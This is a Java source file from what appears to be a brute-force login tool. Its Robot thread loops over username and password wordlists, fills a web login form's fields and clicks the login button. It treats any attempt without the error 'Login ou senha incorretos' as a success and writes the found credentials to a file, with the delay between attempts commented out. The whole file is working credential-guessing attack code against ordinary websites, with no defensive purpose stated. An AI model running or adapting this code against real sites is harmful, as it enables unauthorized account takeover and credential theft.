/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.tronipm.bruteforceguessing.entities;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Mateus
 */
public class Robot extends Thread {

    private WebSite webSite = null;
    private Reader reader = null;
    private Writer writer = null;
    private int delayBetweenAttempts = 0;//milli
    private static final String idInputLogin = "inp_login";
    private static final String idInputPassword = "inp_senha";
    private static final String unsuccessfulAttemptMessage = "Login ou senha incorretos";
    private static final String successfulAttemptMessage = "Olá";
    private static final String idInputButton = "btn_login";

    private static final boolean needsToRedirectAfterAttemp = false;

    public ArrayList<Credential> arraySuccess = new ArrayList<>();

    public Robot(String url, int delayBetweenAttempts) {
        this.webSite = new WebSite(url);
        this.delayBetweenAttempts = delayBetweenAttempts;

        reader = new Reader("./data/user.txt", "./data/pass.txt");
        writer = new Writer("./data/success.txt");
    }

    @Override
    public void run() {
        synchronized (this) {
            reader.start();
            webSite.open(true);

            System.out.println("Starting tests...");
            int p2 = 1;
            for (int u = 0; u < reader.arrayUsers.size(); u++) {
                String user = reader.arrayUsers.get(u);

                for (int p = 0; p < reader.arrayPasswords.size(); p++) {
                    String pass = reader.arrayPasswords.get(p);

                    System.out.println("Attempt: " + (p2++));

                    tryToLogin(user, pass);

                    if (needsToRedirectAfterAttemp) {
                        restart();
                    }
                    //Thread.sleep(delayBetweenAttempts);
                }
            }
            System.out.println("Finishing tests...");

            this.notify();
        }
    }

    /**
     * TODO. Implement this method as you need (check by button, element, text,
     * etc)
     */
    public synchronized void tryToLogin(String user, String pass) {
        webSite.setInputByName(idInputLogin, user);
        webSite.setInputByName(idInputPassword, pass);
        webSite.clickByName(idInputButton);

        boolean checkPageHasText = webSite.checkPageHasText(unsuccessfulAttemptMessage);

        if (!checkPageHasText && user != null && pass != null && user != "" && pass != "") {
            Credential c = new Credential(user, pass);
            arraySuccess.add(c);

            writer.writeOnFile(c.getData() + "\n");
            //c.print();
            webSite.restart();//After success, start over
        }
    }

    synchronized private void restart() {
        webSite.restart();
    }

}
